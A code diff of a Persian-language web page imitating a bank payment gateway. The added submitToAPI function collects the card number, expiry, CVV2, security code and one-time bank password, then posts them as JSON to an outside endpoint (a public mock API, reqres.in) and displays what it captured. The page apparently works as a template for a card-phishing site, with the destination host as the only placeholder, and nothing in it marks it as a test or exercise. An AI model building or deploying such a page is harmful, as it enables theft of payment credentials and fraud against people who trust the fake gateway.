@@ -74,15 +74,6 @@
             background: #dc3545;
             color: #fff;
         }
-        .timer {
-            font-size: 16px;
-            color: red;
-            text-align: center;
-            margin-top: 5px;
-        }
-        .hidden {
-            display: none;
-        }
         .request-btn {
             width: 100%;
             padding: 10px;
@@ -108,51 +99,68 @@
             from { transform: rotate(0deg); }
             to { transform: rotate(360deg); }
         }
+        .result-box {
+            background: #fff;
+            padding: 15px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            margin-top: 20px;
+            text-align: right;
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="payment-form">
         <h2 style="text-align: center;">درگاه پرداخت</h2>
-        
-        <div class="form-group">
-            <label for="card-number">شماره کارت:</label>
-            <input type="text" id="card-number" placeholder="---- ---- ---- ----" maxlength="19" oninput="formatCardNumber(this)">
-        </div>
-        
-        <div class="form-group">
-            <label for="amount">مبلغ (ریال):</label>
-            <input type="text" id="amount" value="1,000,000" disabled>
-        </div>
-        
-        <div class="form-group">
-            <label for="expiry">تاریخ انقضا:</label>
-            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
-        </div>
-
-        <div class="form-group">
-            <label for="cvv2">CVV2:</label>
-            <input type="text" id="cvv2" placeholder="***" maxlength="4">
-        </div>
-
-        <div class="form-group">
-            <label>کد امنیتی:</label>
-            <div class="split-input">
-                <div class="secure-code" id="generated-code"></div>
-                <input type="text" id="security-code" placeholder="کد امنیتی" maxlength="4">
+        <form id="payment-form" onsubmit="submitToAPI(event)">
+            <div class="form-group">
+                <label for="card-number">شماره کارت:</label>
+                <input type="text" id="card-number" name="card-number" placeholder="---- ---- ---- ----" maxlength="19" oninput="formatCardNumber(this)">
             </div>
-        </div>
-
-        <div class="form-group">
-            <label>رمز دوم پویا:</label>
-            <div class="split-input">
-                <input type="text" id="otp-code" placeholder="رمز پویا" maxlength="6">
-                <button class="request-btn" id="request-otp" onclick="requestOTP()">درخواست رمز پویا</button>
-                <div class="timer-circle" id="otp-timer"></div>
+            
+            <div class="form-group">
+                <label for="amount">مبلغ (ریال):</label>
+                <input type="text" id="amount" name="amount" value="1,000,000" disabled>
             </div>
-        </div>
+            
+            <div class="form-group">
+                <label for="expiry">تاریخ انقضا:</label>
+                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
+            </div>
 
-        <button class="submit-btn">پرداخت</button>
-        <button class="cancel-btn" onclick="cancelPayment()">انصراف</button>
+            <div class="form-group">
+                <label for="cvv2">CVV2:</label>
+                <input type="text" id="cvv2" name="cvv2" placeholder="***" maxlength="4">
+            </div>
+
+            <div class="form-group">
+                <label>کد امنیتی:</label>
+                <div class="split-input">
+                    <div class="secure-code" id="generated-code"></div>
+                    <input type="text" id="security-code" name="security-code" placeholder="کد امنیتی" maxlength="4">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>رمز دوم پویا:</label>
+                <div class="split-input">
+                    <input type="text" id="otp-code" name="otp-code" placeholder="رمز پویا" maxlength="6">
+                    <button type="button" class="request-btn" id="request-otp" onclick="requestOTP()">درخواست رمز پویا</button>
+                    <div class="timer-circle" id="otp-timer"></div>
+                </div>
+            </div>
+
+            <button class="submit-btn" type="submit">پرداخت</button>
+            <button class="cancel-btn" type="button" onclick="cancelPayment()">انصراف</button>
+        </form>
+    </div>
+
+    <div class="result-box" id="result-box">
+        <h3>اطلاعات ارسالی:</h3>
+        <pre id="result-text"></pre>
     </div>
 
     <script>
@@ -197,7 +205,42 @@
 
         function cancelPayment() {
             alert("پرداخت لغو شد");
-            window.location.href = "index.html"; // بازگشت به صفحه اصلی یا تغییر مسیر به دلخواه
+            window.location.href = "index.html";
+        }
+
+        function submitToAPI(event) {
+            event.preventDefault();
+            const form = document.getElementById('payment-form');
+            const data = new FormData(form);
+            const jsonData = {
+                "card_number": data.get("card-number"),
+                "amount": data.get("amount"),
+                "expiry": data.get("expiry"),
+                "cvv2": data.get("cvv2"),
+                "security_code": data.get("security-code"),
+                "otp_code": data.get("otp-code"),
+                "timestamp": new Date().toISOString()
+            };
+
+            // ارسال به ReqRes
+            fetch('https://reqres.in/api/users', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(jsonData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                // نمایش اطلاعات توی صفحه
+                const resultBox = document.getElementById('result-box');
+                const resultText = document.getElementById('result-text');
+                resultText.textContent = JSON.stringify(jsonData, null, 2);
+                resultBox.style.display = 'block';
+            })
+            .catch(error => {
+                alert("خطا در ارسال اطلاعات: " + error.message);
+            });
         }
 
         window.onload = function () {
